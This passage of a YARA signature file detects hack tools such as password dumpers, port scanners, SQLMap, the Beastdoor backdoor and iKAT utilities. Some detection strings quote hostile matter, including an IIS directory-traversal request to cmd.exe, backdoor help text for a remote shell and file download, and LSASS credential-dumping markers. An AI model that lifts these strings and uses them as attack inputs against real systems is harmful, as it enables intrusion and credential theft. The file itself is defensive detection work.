		description = "Semi-Auto-generated rule - file msqlx86.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "1190ec4b5a759f7925065e5f6fd4a652"
	strings:
		$s2 = "msqlx86.dll" fullword
		$s3 = "PasswordsPro Module for MS SQL derived hashes"
	condition:
		all of them
}
rule _PasswordsPro_v2_5_5_0_Modules_MD2 {
	meta:
		description = "Semi-Auto-generated rule - file MD2.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "a737ef9eb70463d8a100a193b736233b"
	strings:
		$s2 = "Hash type: MD2" fullword
		$s4 = "MD2.dll" fullword
		$s7 = "Sep 29 2009" fullword
	condition:
		all of them
}
rule md5_md5__salt__md5__pass__ {
	meta:
		description = "Semi-Auto-generated rule - file md5(md5($salt).md5($pass)).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "b8e7f79ae917fdb23d6f86df0f6d0b79"
	strings:
		$s15 = "Hash type: md5(md5($salt).md5($pass)) [PHP], used with IPB v2.x.x" fullword
		$s16 = "md5(md5($salt).md5($pass)).dll" fullword
	condition:
		all of them
}
rule sha1__pass__salt_ {
	meta:
		description = "Semi-Auto-generated rule - file sha1($pass.$salt).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "ffd6759b439392021c458fb2c485bec9"
	strings:
		$s3 = "Hash type: sha1($pass.$salt) [PHP]" fullword
		$s5 = "sha1($pass.$salt).dll" fullword
	condition:
		all of them
}
rule md5_md5_md5__pass___ {
	meta:
		description = "Semi-Auto-generated rule - file md5(md5(md5($pass))).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "d929dd4f2d74538d72322d0e22482844"
	strings:
		$s9 = "md5(md5(md5($pass))) [PHP]" fullword
		$s10 = "Hash type: md5(md5(md5($pass))) [PHP]" fullword
	condition:
		all of them
}
rule MD4_Base64_ {
	meta:
		description = "Semi-Auto-generated rule - file MD4(Base64).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "82311044dc971566423576412a904fab"
	strings:
		$s5 = "Hash type: MD4(Base64)" fullword
		$s6 = "MD4(Base64).dll" fullword
	condition:
		all of them
}
rule sha1__salt__pass_ {
	meta:
		description = "Semi-Auto-generated rule - file sha1($salt.$pass).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "59dc186925b22991de5a336e292f2ce3"
	strings:
		$s7 = "sha1($salt.$pass).dll" fullword
		$s16 = "Hash type: sha1($salt.$pass) [PHP]" fullword
	condition:
		all of them
}
rule Haval_224 {
	meta:
		description = "Semi-Auto-generated rule - file Haval-224.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "ddf13938e2b45f5d6ee663f92d08b819"
	strings:
		$s8 = "Haval-224.dll" fullword
		$s13 = "Hash type: Haval-224" fullword
	condition:
		all of them
}
rule oracle_sha1 {
	meta:
		description = "Semi-Auto-generated rule - file oracle_sha1.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "75820859f57675468047963e09de57cb"
	strings:
		$s3 = "PasswordsPro Module for ORACLE SHA-1 derived hashes"
	condition:
		all of them
}
rule _PasswordsPro_v2_5_5_0_Modules_MySQL {
	meta:
		description = "Semi-Auto-generated rule - file MySQL.dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "f083ec27087bb8f5c8eed88437230bfb"
	strings:
		$s4 = "Hash type: MySQL" fullword
		$s10 = "MySQL.dll" fullword
	condition:
		all of them
}
rule PasswordFox {
	meta:
		description = "Semi-Auto-generated rule - file PasswordFox.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "ac5808334832032b0e7df1a2351e207f"
	strings:
		$s2 = "<assemblyIdentity type=\"Win32\" name=\"Microsoft.Windows.Common-Controls"
		$s4 = "InitCommon" fullword
		$s8 = "SELECT id, host" fullword
		$s9 = "s'FilEx)" fullword
		$s16 = "</assembly>PA" fullword
	condition:
		all of them
}
rule md5__salt__pass_ {
	meta:
		description = "Semi-Auto-generated rule - file md5($salt.$pass).dll"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "643ce730e70a475d2e4101beb7356426"
	strings:
		$s10 = "md5($salt.$pass) [PHP]" fullword
		$s12 = "Hash type: md5($salt.$pass) [PHP], used with Gallery v2.0.x" fullword
	condition:
		all of them
}
rule _Protected_Storage_PassView_163_pspv {
	meta:
		description = "Semi-Auto-generated rule - file pspv.exe"
		author = "Yara Bulk Rule Generator; customization by Stefan -dfate- Molls, Florian Roth"
		hash = "35861f4ea9a8ecb6c357bdb91b7df804"
	strings:
		$s2 = "Outlook Account Manager Passwords" fullword
		$s5 = "Protected Storage PassView" fullword
		$s8 = "inetcomm server passwords" fullword
	condition:
		all of them
}

rule QuarksPwDump
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the QuarksPwDump Password dumper tool"
		date = "06/2014"
		score = 60
	strings:
		$s1 = "Quarks PwDump" fullword
		$s2 = "Example: quarks-pwdump.exe" fullword
		$s3 = "-<(QuarksLab)>-"
		$s4 = " /  / \\  \\ |  |  \\\\__  \\ \\_  __ \\|"
	condition:
	PEFILE and 1 of ($s*)
}

rule Fierce2
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the Fierce2 domain scanner"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"
	condition:
		1 of them
}

rule Ncrack
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the Ncrack brute force tool"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"
	condition:
		1 of them
}

rule SQLMap
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the SQLMap SQL injection tool"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "except SqlmapBaseException, ex:"
	condition:
		1 of them
}

rule PortScanner {
	meta:
		description = "Auto-generated rule on file PortScanner.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b381b9212282c0c650cb4b0323436c63"
	strings:
		$s0 = "Scan Ports Every"
		$s3 = "Scan All Possible Ports!"
	condition:
		all of them
}
rule DomainScanV1_0 {
	meta:
		description = "Auto-generated rule on file DomainScanV1_0.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "aefcd73b802e1c2bdc9b2ef206a4f24e"
	strings:
		$s0 = "dIJMuX$aO-EV"
		$s1 = "XELUxP\"-\\"
		$s2 = "KaR\"U'}-M,."
		$s3 = "V.)\\ZDxpLSav"
		$s4 = "Decompress error"
		$s5 = "Can't load library"
		$s6 = "Can't load function"
		$s7 = "com0tl32:.d"
	condition:
		all of them
}
rule netscantools4or_zip_Folder_setup {
	meta:
		description = "Auto-generated rule on file setup.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "2a8b6c8021850d6232c6bc17d7149aca"
	strings:
		$s4 = "NetScanTools 4.20 Trial Version Installation"
	condition:
		all of them
}
rule MooreR_Port_Scanner {
	meta:
		description = "Auto-generated rule on file MooreR Port Scanner.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "376304acdd0b0251c8b19fea20bb6f5b"
	strings:
		$s0 = "Description|"
		$s3 = "soft Visual Studio\\VB9yp"
		$s4 = "adj_fptan?4"
		$s7 = "DOWS\\SyMem32\\/o"
	condition:
		all of them
}
rule NetBIOS_Name_Scanner {
	meta:
		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
	strings:
		$s0 = "IconEx"
		$s2 = "soft Visual Stu"
		$s4 = "NBTScanner!y&"
	condition:
		all of them
}
rule TrojanHunter_th {
	meta:
		description = "Auto-generated rule on file th.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "6e6c8bf8b294b4c19e8e3fcaa4373037"
	strings:
		$s4 = "Decompress error        "
		$s5 = "TrykorA- f"
		$s7 = "SI_CHwRrETm"
	condition:
		all of them
}
rule IP_Grabber_v3 {
	meta:
		description = "Auto-generated rule on file IP Grabber v3.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "f444b7085584bf1ddad4dbda494d4459"
	strings:
		$s0 = "cTkoh\\l"
		$s1 = "UljVifK"
		$s2 = "6YHXjaf"
		$s3 = "The procedure entry point %s could not be located in the dynamic link library %s"
		$s4 = "The ordinal %u could not be located in the dynamic link library %s"
	condition:
		all of them
}
rule FeliksPack3___Scanners_ipscan {
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "6c1bcf0b1297689c8c4c12cc70996a75"
	strings:
		$s2 = "WCAP;}ECTED"
		$s4 = "NotSupported"
		$s6 = "SCAN.VERSION{_"
	condition:
		all of them
}
rule CGISscan_CGIScan {
	meta:
		description = "Auto-generated rule on file CGIScan.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "338820e4e8e7c943074d5a5bc832458a"
	strings:
		$s1 = "Wang Products" fullword wide
		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
		$s3 = "tcp is the only protocol supported thru socks server"
	condition:
		all of ($s*)
}
rule IP_Stealing_Utilities {
	meta:
		description = "Auto-generated rule on file IP Stealing Utilities.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
	strings:
		$s0 = "DarkKnight"
		$s9 = "IPStealerUtilities"
	condition:
		all of them
}
rule SuperScan4 {
	meta:
		description = "Auto-generated rule on file SuperScan4.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "78f76428ede30e555044b83c47bc86f0"
	strings:
		$s2 = " td class=\"summO1\">"
		$s6 = "REM'EBAqRISE"
		$s7 = "CorExitProcess'msc#e"
	condition:
		all of them
}
rule PortRacer {
	meta:
		description = "Auto-generated rule on file PortRacer.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "2834a872a0a8da5b1be5db65dfdef388"
	strings:
		$s0 = "Auto Scroll BOTH Text Boxes"
		$s4 = "Start/Stop Portscanning"
		$s6 = "Auto Save LogFile by pressing STOP"
	condition:
		all of them
}
rule scanarator {
	meta:
		description = "Auto-generated rule on file scanarator.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "848bd5a518e0b6c05bd29aceb8536c46"
	strings:
		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"
	condition:
		all of them
}
rule aolipsniffer {
	meta:
		description = "Auto-generated rule on file aolipsniffer.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "51565754ea43d2d57b712d9f0a3e62b8"
	strings:
		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
		$s1 = "dwGetAddressForObject"
		$s2 = "Color Transfer Settings"
		$s3 = "FX Global Lighting Angle"
		$s4 = "Version compatibility info"
		$s5 = "New Windows Thumbnail"
		$s6 = "Layer ID Generator Base"
		$s7 = "Color Halftone Settings"
		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"
	condition:
		all of them
}
rule _Bitchin_Threads_ {
	meta:
		description = "Auto-generated rule on file =Bitchin Threads=.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
	strings:
		$s0 = "DarKPaiN"
		$s1 = "=BITCHIN THREADS"
	condition:
		all of them
}
rule cgis4_cgis4 {
	meta:
		description = "Auto-generated rule on file cgis4.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "d658dad1cd759d7f7d67da010e47ca23"
	strings:
		$s0 = ")PuMB_syJ"
		$s1 = "&,fARW>yR"
		$s2 = "m3hm3t_rullaz"
		$s3 = "7Projectc1"
		$s4 = "Ten-GGl\""
		$s5 = "/Moziqlxa"
	condition:
		all of them
}
rule ITrace32 {
	meta:
		description = "Auto-generated rule on file ITrace32.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "b5e51291ec9e61cb2a4ff5c96d4caf32"
	strings:
		$s7 = "%d bytes %s %s: icmp_type=%d (%s) icmp_code=%d"
		$s9 = "Non-recoverable: refused or not implemented"
	condition:
		all of them
}
rule portscan {
	meta:
		description = "Auto-generated rule on file portscan.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "a8bfdb2a925e89a281956b1e3bb32348"
	strings:
		$s5 = "0    :SCAN BEGUN ON PORT:"
		$s6 = "0    :PORTSCAN READY."
	condition:
		all of them
}
rule ProPort_zip_Folder_ProPort {
	meta:
		description = "Auto-generated rule on file ProPort.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
	strings:
		$s0 = "Corrupt Data!"
		$s1 = "K4p~omkIz"
		$s2 = "DllTrojanScan"
		$s3 = "GetDllInfo"
		$s4 = "Compressed by Petite (c)1999 Ian Luck."
		$s5 = "GetFileCRC32"
		$s6 = "GetTrojanNumber"
		$s7 = "TFAKAbout"
	condition:
		all of them
}
rule StealthWasp_s_Basic_PortScanner_v1_2 {
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"
	condition:
		all of them
}
rule BluesPortScan {
	meta:
		description = "Auto-generated rule on file BluesPortScan.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "6292f5fc737511f91af5e35643fc9eef"
	strings:
		$s0 = "This program was made by Volker Voss"
		$s1 = "JiBOo~SSB"
	condition:
		all of them
}
rule scanarator_iis {
	meta:
		description = "Auto-generated rule on file iis.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
	strings:
		$s0 = "example: iis 10.10.10.10"
		$s1 = "send error"
	condition:
		all of them
}
rule stealth_Stealth {
	meta:
		description = "Auto-generated rule on file Stealth.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
	strings:
		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
		$s6 = "This tool may be used only by system administrators. I am not responsible for "
	condition:
		all of them
}
rule Angry_IP_Scanner_v2_08_ipscan {
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "70cf2c09776a29c3e837cb79d291514a"
	strings:
		$s0 = "_H/EnumDisplay/"
		$s5 = "ECTED.MSVCRT0x"
		$s8 = "NotSupported7"
	condition:
		all of them
}
rule crack_Loader {
	meta:
		description = "Auto-generated rule on file Loader.exe"
		author = "Yara Bulk Rule Generator by Florian Roth"
		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
	strings:
		$s0 = "NeoWait.exe"
		$s1 = "RRRRRRRW"
	condition:
		all of them
}

rule CN_GUI_Scanner {
	meta:
		description = "Detects an unknown GUI scanner tool - CN background"
		author = "Florian Roth"
		hash = "3c67bbb1911cdaef5e675c56145e1112"
		score = 65
		date = "04.10.2014"
	strings:
		$s1 = "good.txt" fullword ascii
		$s2 = "IP.txt" fullword ascii
		$s3 = "xiaoyuer" fullword ascii
		$s0w = "ssh(" fullword wide
		$s1w = ").exe" fullword wide
	condition:
		all of them
}

rule CN_Packed_Scanner {
	meta:
		description = "Suspiciously packed executable"
		author = "Florian Roth"
		hash = "6323b51c116a77e3fba98f7bb7ff4ac6"
		score = 40
		date = "06.10.2014"
	strings:
		$s1 = "kernel32.dll" fullword ascii
		$s2 = "CRTDLL.DLL" fullword ascii
		$s3 = "__GetMainArgs" fullword ascii
		$s4 = "WS2_32.DLL" fullword ascii
	condition:
		all of them and filesize < 180KB and filesize > 70KB
}

rule Tiny_Network_Tool_Generic {
	meta:
		description = "Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)"
		author = "Florian Roth"
		date = "08.10.2014"
		score = 40
		type = "file"
		hash0 = "9e1ab25a937f39ed8b031cd8cfbc4c07"
		hash1 = "cafc31d39c1e4721af3ba519759884b9"
		hash2 = "8e635b9a1e5aa5ef84bfa619bd2a1f92"
	strings:
		$s0 = "KERNEL32.DLL" fullword ascii
		$s1 = "CRTDLL.DLL" fullword ascii
		$s3 = "LoadLibraryA" fullword ascii
		$s4 = "GetProcAddress" fullword ascii

		$y1 = "WININET.DLL" fullword ascii
		$y2 = "atoi" fullword ascii

		$x1 = "ADVAPI32.DLL" fullword ascii
		$x2 = "USER32.DLL" fullword ascii
		$x3 = "wsock32.dll" fullword ascii
		$x4 = "FreeSid" fullword ascii
		$x5 = "atoi" fullword ascii

		$z1 = "ADVAPI32.DLL" fullword ascii
		$z2 = "USER32.DLL" fullword ascii
		$z3 = "FreeSid" fullword ascii
		$z4 = "ToAscii" fullword ascii

	condition:
		PEFILE and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB
}

rule Beastdoor_Backdoor {
	meta:
		description = "Detects the backdoor Beastdoor"
		author = "Florian Roth"
		score = 55
		hash = "5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a"
	strings:
		$s0 = "Redirect SPort RemoteHost RPort  -->Port Redirector" fullword
		$s1 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword
		$s2 = "http://IP/a.exe a.exe            -->Download A File" fullword
		$s7 = "Host: wwp.mirabilis.com:80" fullword
		$s8 = "%s -Set Port PortNumber              -->Set The Service Port" fullword
		$s11 = "Shell                            -->Get A Shell" fullword
		$s14 = "DeleteService ServiceName        -->Delete A Service" fullword
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword
		$s17 = "%s -Set ServiceName ServiceName      -->Set The Service Name" fullword
	condition:
		2 of them
}

rule Chinese_Hacktool_1014 {
	meta:
		description = "Detects a chinese hacktool with unknown use"
		author = "Florian Roth"
		score = 60
		date = "10.10.2014"
		hash = "98c07a62f7f0842bcdbf941170f34990"
	strings:
		$s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
		$s1 = "msctls_progress32" fullword wide
		$s2 = "Reply-To: %s" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
		$s4 = "html htm htx asp" fullword ascii
	condition:
		all of them
}

rule CN_Hacktool_BAT_PortsOpen {
	meta:
		description = "Detects a chinese BAT hacktool for local port evaluation"
		author = "Florian Roth"
		score = 60
		date = "12.10.2014"
	strings:
		$s0 = "for /f \"skip=4 tokens=2,5\" %%a in ('netstat -ano -p TCP') do (" ascii
		$s1 = "in ('tasklist /fi \"PID eq %%b\" /FO CSV') do " ascii
		$s2 = "@echo off" ascii
	condition:
		all of them
}

rule CN_Hacktool_SSPort_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named SSPort"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "Golden Fox" fullword wide
		$s1 = "Syn Scan Port" fullword wide
		$s2 = "CZ88.NET" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_ScanPort_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named ScanPort"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "LScanPort" fullword wide
		$s1 = "LScanPort Microsoft" fullword wide
		$s2 = "www.yupsoft.com" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_S_EXE_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named s.exe"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "\\Result.txt" fullword ascii
		$s1 = "By:ZT QQ:376789051" fullword ascii
		$s2 = "(http://www.eyuyan.com)" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_Producer_String {
	meta:
		description = "Detects a chinese hacktool producer"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "www.hack44.cn"
		$s1 = "www.huc123.com"
	condition:
		PEFILE and 1 of ($s*)
}

rule CN_Hacktool_MilkT_Scanner {
	meta:
		description = "Detects a chinese Portscanner named MilkT"
		author = "Florian Roth"
		score = 60
		date = "12.10.2014"
	strings:
		$s0 = "Bf **************" ascii fullword
		$s1 = "forming Time: %d/" ascii
		$s2 = "KERNEL32.DLL" ascii fullword
		$s3 = "CRTDLL.DLL" ascii fullword
		$s4 = "WS2_32.DLL" ascii fullword
		$s5 = "GetProcAddress" ascii fullword
		$s6 = "atoi" ascii fullword
	condition:
		all of them
}

rule CN_Hacktool_1433_Scanner_UPX {
	meta:
		description = "Detects a chinese MSSQL scanner (UPX Packed)"
		author = "Florian Roth"
		score = 40
		date = "12.10.2014"
	strings:
		$s0 = "1433" wide fullword
		$s1 = "1433V" wide
		$s2 = "UPX1" ascii fullword
	condition:
		PEFILE and all of ($s*)
}

rule CN_Hacktool_1433_Scanner_Comp2 {
	meta:
		description = "Detects a chinese MSSQL scanner - component 2"
		author = "Florian Roth"
		score = 40
		date = "12.10.2014"
	strings:
		$s0 = "1433" wide fullword
		$s1 = "1433V" wide
		$s2 = "UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU" ascii fullword
	condition:
		PEFILE and all of ($s*)
}

rule WCE_Modified_1_1014 {
	meta:
		description = "Modified (packed) version of Windows Credential Editor"
		author = "Florian Roth"
		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
		score = 70
	strings:
		$s0 = "LSASS.EXE" fullword ascii
		$s1 = "_CREDS" ascii
		$s9 = "Using WCE " ascii
	condition:
		all of them
}

rule ReactOS_cmd_valid {
	meta:
		description = "ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
		score = 30
		hash = "b88f050fa69d85af3ff99af90a157435296cbb6e"
	strings:
		$s1 = "ReactOS Command Processor" fullword wide
		$s2 = "Copyright (C) 1994-1998 Tim Norman and others" fullword wide
		$s3 = "Eric Kohl and others" fullword wide
		$s4 = "ReactOS Operating System" fullword wide
	condition:
		all of ($s*) and filename contains "cmd.exe"
}

rule ReactOS_cmd_cloaked {
	meta:
		description = "ReactOS cmd.exe with cloaked file name - maybe packed with software or part of hacker toolset"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
		score = 75
		hash = "b88f050fa69d85af3ff99af90a157435296cbb6e"
	strings:
		$s1 = "ReactOS Command Processor" fullword wide
		$s2 = "Copyright (C) 1994-1998 Tim Norman and others" fullword wide
		$s3 = "Eric Kohl and others" fullword wide
		$s4 = "ReactOS Operating System" fullword wide
	condition:
		all of ($s*) and not filename contains "cmd.exe"
}

rule FreeDOS_command_com_valid {
	meta:
		description = "FreeDOS command.com with correct file name - maybe packed with software or part of hacker toolset"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
		score = 50
		hash = "13e46cf5e771291b232b364f3b54323270df4389"
	strings:
		$s1 = "The CTTY command has been excluded from this COMMAND.COM." fullword
		$s2 = "FreeDOS command shell redistribution information." fullword
		$s3 = "  [drive:]path    Specifies the directory containing COMMAND.COM." fullword
		$s4 = "FREECOM" fullword ascii
	condition:
		all of ($s*) and filename contains "command.com"
}

rule iKAT_wmi_rundll {
	meta:
		description = "This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 65
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "97c4d4e6a644eed5aa12437805e39213e494d120"
	strings:
		$s0 = "This operating system is not supported." fullword ascii
		$s1 = "Error!" fullword ascii
		$s2 = "Win32 only!" fullword ascii
		$s3 = "COMCTL32.dll" fullword ascii
		$s4 = "[LordPE]" ascii
		$s5 = "CRTDLL.dll" fullword ascii
		$s6 = "VBScript" fullword ascii
		$s7 = "CoUninitialize" fullword ascii
	condition:
		all of them and filesize < 15KB
}

rule iKAT_revelations {
	meta:
		description = "iKAT hack tool showing the content of password fields - file revelations.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "c4e217a8f2a2433297961561c5926cbd522f7996"
	strings:
		$s0 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
		$s8 = "BETAsupport@snadboy.com" fullword wide
		$s9 = "support@snadboy.com" fullword wide
		$s14 = "RevelationHelper.dll" fullword ascii
	condition:
		all of them
}

rule iKAT_command_lines_agent {
	meta:
		description = "iKAT hack tools set agent - file ikat.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "c802ee1e49c0eae2a3fc22d2e82589d857f96d94"
	strings:
		$s0 = "Extended Module: super mario brothers" fullword ascii
		$s1 = "Extended Module: " fullword ascii
		$s3 = "ofpurenostalgicfeeling" fullword ascii
		$s8 = "-supermariobrotheretic" fullword ascii
		$s9 = "!http://132.147.96.202:80" fullword ascii
		$s12 = "iKAT Exe Template" fullword ascii
		$s15 = "withadancyflavour.." fullword ascii
		$s16 = "FastTracker v2.00   " fullword ascii
	condition:
		4 of them
}

rule iKAT_cmd_as_dll {
	meta:
		description = "iKAT toolset file cmd.dll ReactOS file cloaked"
		author = "Florian Roth"
		date = "05.11.14"
		score = 65
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "b5d0ba941efbc3b5c97fe70f70c14b2050b8336a"
	strings:
		$s1 = "cmd.exe" fullword wide
		$s2 = "ReactOS Development Team" fullword wide
		$s3 = "ReactOS Command Processor" fullword wide
	condition:
		all of ($s*) and extension == ".dll"
}

rule iKAT_cmd_as_exe {
	meta:
		description = "Command line XP - file cmd.exe - with a different name"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		type = "file"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "e5e009860104cf20ed3d126f6f092f780fac5293"
	strings:
		$s0 = "If /D was NOT specified on the command line, then when CMD.EXE starts, i" wide
		$s1 = "Changes the cmd.exe command prompt." fullword wide
		$s4 = "enabled/disabled via the /V command line switch to CMD.EXE.  See CMD /?" fullword wide
		$s5 = "forms of the FOR command are supported:" fullword wide
		$s2 = "Microsoft Windows XP" wide
	condition:
		all of ($s*) and not filename contains "cmd.exe"
}

rule iKAT_tools_nmap {
	meta:
		description = "Generic rule for NMAP - based on NMAP 4 standalone"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "d0543f365df61e6ebb5e345943577cc40fca8682"
	strings:
		$s0 = "Insecure.Org" fullword wide
		$s1 = "Copyright (c) Insecure.Com" fullword wide
		$s2 = "nmap" fullword nocase
		$s3 = "Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm)." ascii
	condition:
		all of them
}

rule iKAT_startbar {
	meta:
		description = "Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "0cac59b80b5427a8780168e1b85c540efffaf74f"
	strings:
		$s2 = "Shinysoft Limited1" fullword ascii
		$s3 = "Shinysoft Limited0" fullword ascii
		$s4 = "Wellington1" fullword ascii
		$s6 = "Wainuiomata1" fullword ascii
		$s8 = "56 Wright St1" fullword ascii
		$s9 = "UTN-USERFirst-Object" fullword ascii
		$s10 = "New Zealand1" fullword ascii
	condition:
		all of them
}

rule iKAT_Tool_Generic {
	meta:
		description = "Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 55
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		super_rule = 1
		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
		hash1 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
		hash2 = "b65a460d015fd94830d55e8eeaf6222321e12349"
	strings:
		$s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword
		$s1 = "Failed to read the entire file" fullword
		$s4 = "<VersionCreatedBy>14.4.0</VersionCreatedBy>" fullword
		$s8 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P"
		$s9 = "Running Zip pipeline..." fullword
		$s10 = "<FinTitle />" fullword
		$s12 = "<AutoTemp>0</AutoTemp>" fullword
		$s14 = "<DefaultDir>%TEMP%</DefaultDir>" fullword
		$s15 = "AES Encrypting..." fullword
		$s20 = "<UnzipDir>%TEMP%</UnzipDir>" fullword
	condition:
		all of them
}

rule Cmder_alt_commandline {
	meta:
		description = "Detects the tool cmder - an alternative command line for Windows"
		author = "Florian Roth"
		date = "07.11.14"
		score = 55
		reference = "http://bliker.github.io/cmder/"
		hash0 = "1adbd52259aa10662e32f6c690033720"
	strings:
		$s0 = "Cmder Here" fullword wide
